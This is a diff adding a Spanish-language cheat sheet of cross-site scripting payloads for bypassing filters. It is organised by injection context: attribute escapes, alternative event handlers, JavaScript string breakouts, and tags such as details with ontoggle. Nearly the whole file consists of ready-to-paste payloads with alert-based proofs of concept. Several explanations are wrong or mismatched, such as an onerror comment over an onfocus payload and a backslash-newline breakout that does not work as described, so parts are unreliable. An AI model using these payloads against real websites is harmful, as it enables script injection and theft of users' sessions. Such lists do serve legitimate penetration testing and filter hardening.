@@ -1,0 +1,71 @@
+# =========================================================
+# PAYLOADS XSS DE BYPASS POR CONTEXTO (Context-Specific Bypass)
+# =========================================================
+# Estos payloads están diseñados para escapar de un contexto específico (HTML, atributo, 
+# JavaScript) y ejecutar código, incluso cuando las comillas o tags están filtrados.
+
+# 1. ESCAPE DE ATRIBUTO HTML
+# -----------------------------
+# Se usa cuando el input se refleja dentro de las comillas de un atributo, pero no se ha sanitizado.
+# Contexto vulnerable: <input type="text" value="[INPUT]">
+
+# 1.1 Inyección en atributo con comilla doble (")
+# El payload cierra la comilla doble, inserta el nuevo evento (onerror) y cierra la etiqueta (>)
+# PAYLOAD: " onfocus="alert(1)" autofocus="
+
+# 1.2 Inyección en atributo con comilla simple (')
+# Contexto vulnerable: <a href='[INPUT]'>
+
+# PAYLOAD: ' onclick='alert(1)
+
+# 1.3 Inyección sin comillas (Si el input no está entre comillas, o se pueden usar espacios)
+# Contexto vulnerable: <a href=javascript:[INPUT]> (Filtra 'javascript')
+
+# PAYLOAD: onmouseover=alert(1) (solo si el contexto permite la adición de atributos)
+
+# 2. BYPASS DE ATRIBUTOS HTML ESPECÍFICOS
+# ---------------------------------------------
+# Uso de atributos que no son 'onerror', que a menudo son los más filtrados.
+
+# 2.1 Uso del atributo 'onfocus' (Requiere interacción o un autofocus)
+# Se cierra el atributo y se fuerza el foco automáticamente para ejecutar.
+# Contexto: <input type="text" value="[INPUT]">
+# PAYLOAD: " onfocus="alert(1)" autofocus="
+
+# 2.2 Uso de atributos de estilo (style)
+# Si se permite la inyección en un atributo de estilo, se puede usar CSS para ejecutar JS.
+# PAYLOAD: style="width: expression(alert(1));" (Solo funciona en IE, pero es una técnica)
+
+# 2.3 Uso del atributo base/frameset (para redirigir o manipular contenido)
+# PAYLOAD: <base href="javascript:alert(1);">
+
+# 3. ESCAPE DE CONTEXTO JAVASCRIPT
+# ------------------------------------
+# Ocurre cuando el input se refleja dentro de un string de JavaScript existente.
+# Contexto vulnerable: var user = "[INPUT]";
+
+# 3.1 Cierre de String con Comilla Doble (")
+# PAYLOAD: "; alert(document.domain)//
+# Resultado en el código: var user = ""; alert(document.domain)//";
+
+# 3.2 Cierre de String con Comilla Simple (')
+# Contexto vulnerable: var page = '[INPUT]';
+# PAYLOAD: '; alert(document.domain)//
+# Resultado en el código: var page = ''; alert(document.domain)//';
+
+# 3.3 Cierre de String con Backslash y Newline (\)
+# Si no se permiten comillas, se puede intentar escapar la línea.
+# Contexto: var user = [INPUT]; (sin comillas)
+# PAYLOAD: \nalert(1)//
+# Resultado en código: var user = \nalert(1)//;
+
+# 4. BYPASS CON TAGS SIN CIERRE (SANS-CLOSURE TAGS)
+# ----------------------------------------------------
+# Uso de tags que no necesitan ser cerrados para que el navegador los interprete.
+
+# 4.1 Uso de <br> o <p> (Si el filtro solo busca tags autocerrados como <img>)
+# PAYLOAD: <a href=javascript:alert(1)><p>
+
+# 4.2 Uso de <details> y <ontoggle>
+# Evento moderno que a menudo no está en listas negras.
+# PAYLOAD: <details open ontoggle=alert(1)>
